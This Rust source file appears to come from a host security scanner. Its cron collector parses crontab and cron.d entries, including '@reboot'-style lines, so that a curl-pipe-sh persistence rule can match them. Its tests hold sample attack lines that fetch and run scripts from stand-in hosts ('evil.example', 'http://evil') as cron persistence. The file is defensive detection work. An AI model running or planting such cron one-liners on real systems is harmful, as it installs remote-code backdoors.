use super::Collector;
use crate::models::Fact;
use serde_json::Value;
use std::path::Path;
use std::process::Command;

pub struct CronEntriesCollector;

/// Parses one crontab-style file's text into fact rows. `has_user_field` distinguishes
/// `/etc/cron.d/*` and `/etc/crontab` syntax (`min hour dom month dow user command`) from a
/// personal `crontab -l` (`min hour dom month dow command`) — the extra column shifts where the
/// command starts.
///
/// Handles both the five-field time spec and the `@nickname` shorthand (`@reboot`, `@daily`, …).
/// The `@`-forms are not a curiosity: `@reboot curl … | sh` is the single most common persistence
/// one-liner, and the old parser — which assumed five whitespace-separated time fields — split it
/// so that the shell payload landed in the schedule and `sh` in the command, so BLWK-ACCT-001
/// (critical) never matched it. A one-token change to an attacker's crontab evaded the rule.
pub fn parse_cron_text(text: &str, source: &str, has_user_field: bool) -> Vec<Fact> {
    let mut rows = Vec::new();
    for line in text.lines() {
        let line = line.trim();
        if line.is_empty() || line.starts_with('#') {
            continue;
        }
        let (schedule, command) = if line.starts_with('@') {
            // `@nickname [user] command`
            let n = if has_user_field { 3 } else { 2 };
            let f: Vec<&str> = line.splitn(n, char::is_whitespace).collect();
            if f.len() < n {
                continue;
            }
            (f[0].to_string(), f[n - 1].to_string())
        } else {
            let n = if has_user_field { 7 } else { 6 };
            let f: Vec<&str> = line.splitn(n, char::is_whitespace).collect();
            if f.len() < n {
                continue;
            }
            (f[..5].join(" "), f[n - 1].to_string())
        };

        let mut fact = Fact::new();
        fact.insert("source".to_string(), Value::String(source.to_string()));
        fact.insert("schedule".to_string(), Value::String(schedule));
        fact.insert("command".to_string(), Value::String(command));
        rows.push(fact);
    }
    rows
}

impl Collector for CronEntriesCollector {
    fn name(&self) -> &'static str {
        "cron_entries"
    }

    fn collect(&self) -> anyhow::Result<Vec<Fact>> {
        let mut rows = Vec::new();

        // Personal crontab — absence (exit status, "no crontab for user") is normal, not an error.
        if let Ok(output) = Command::new("crontab").arg("-l").output() {
            if output.status.success() {
                let text = String::from_utf8_lossy(&output.stdout);
                rows.extend(parse_cron_text(&text, "crontab", false));
            }
        }

        // The system crontab. Has a user field, and on this host carries the real run-parts
        // entries. It was missed entirely before — a malicious line here was invisible.
        if let Ok(text) = std::fs::read_to_string("/etc/crontab") {
            rows.extend(parse_cron_text(&text, "/etc/crontab", true));
        }

        // Every user's crontab spool. The directory is root-only (0700), so under an unprivileged
        // scan this read just fails and is skipped — but under a privileged scan it catches a
        // persistence entry planted in *another* user's crontab, which `crontab -l` (current user
        // only) never sees.
        if let Ok(dir) = std::fs::read_dir("/var/spool/cron/crontabs") {
            for entry in dir.flatten() {
                let path = entry.path();
                if !path.is_file() {
                    continue;
                }
                let user = path
                    .file_name()
                    .and_then(|n| n.to_str())
                    .unwrap_or_default();
                if let Ok(text) = std::fs::read_to_string(&path) {
                    rows.extend(parse_cron_text(
                        &text,
                        &format!("/var/spool/cron/crontabs/{user}"),
                        false,
                    ));
                }
            }
        }

        // System-wide drop-ins, world-readable by convention.
        if let Ok(dir) = std::fs::read_dir("/etc/cron.d") {
            for entry in dir.flatten() {
                let path = entry.path();
                if !path.is_file() {
                    continue;
                }
                let name = path
                    .file_name()
                    .and_then(|n| n.to_str())
                    .unwrap_or_default();
                if name.starts_with('.') || name.eq_ignore_ascii_case("README") {
                    continue;
                }
                if let Ok(text) = std::fs::read_to_string(&path) {
                    rows.extend(parse_cron_text(&text, &format!("/etc/cron.d/{name}"), true));
                }
            }
        }

        Ok(rows)
    }
}

impl CronEntriesCollector {
    #[allow(dead_code)]
    fn cron_d_exists() -> bool {
        Path::new("/etc/cron.d").is_dir()
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn parses_personal_crontab() {
        let text = "# comment\n0 6 * * * /home/user/script.sh --flag\n";
        let rows = parse_cron_text(text, "crontab", false);
        assert_eq!(rows.len(), 1);
        assert_eq!(rows[0].get("schedule").unwrap(), "0 6 * * *");
        assert_eq!(
            rows[0].get("command").unwrap(),
            "/home/user/script.sh --flag"
        );
    }

    #[test]
    fn parses_system_cron_d_with_user_field() {
        let text = "0 7 * * * root /usr/local/bin/daily-check.sh\n";
        let rows = parse_cron_text(text, "/etc/cron.d/example", true);
        assert_eq!(rows.len(), 1);
        assert_eq!(
            rows[0].get("command").unwrap(),
            "/usr/local/bin/daily-check.sh"
        );
    }

    #[test]
    fn at_reboot_curl_pipe_sh_is_parsed_as_one_command_not_split() {
        // The evasion: `@reboot` has no five-field time spec, so the old parser mangled it and the
        // critical curl-pipe-sh rule never matched. The whole payload must land in `command`.
        let personal = parse_cron_text(
            "@reboot curl -s https://evil.example/x.sh | sh\n",
            "crontab",
            false,
        );
        assert_eq!(personal.len(), 1);
        assert_eq!(personal[0].get("schedule").unwrap(), "@reboot");
        assert_eq!(
            personal[0].get("command").unwrap(),
            "curl -s https://evil.example/x.sh | sh"
        );

        // And with a user field (system crontab / cron.d).
        let system = parse_cron_text(
            "@daily root wget -O- http://evil | bash\n",
            "/etc/crontab",
            true,
        );
        assert_eq!(system.len(), 1);
        assert_eq!(system[0].get("schedule").unwrap(), "@daily");
        assert_eq!(
            system[0].get("command").unwrap(),
            "wget -O- http://evil | bash"
        );
    }

    #[test]
    fn env_assignment_lines_in_etc_crontab_are_ignored() {
        // /etc/crontab starts with SHELL=/PATH= lines that are not cron entries.
        let text = "SHELL=/bin/sh\nPATH=/usr/bin:/bin\n17 *\t* * *\troot\tcd / && run-parts /etc/cron.hourly\n";
        let rows = parse_cron_text(text, "/etc/crontab", true);
        assert_eq!(rows.len(), 1);
        assert_eq!(
            rows[0].get("command").unwrap(),
            "cd / && run-parts /etc/cron.hourly"
        );
    }
}
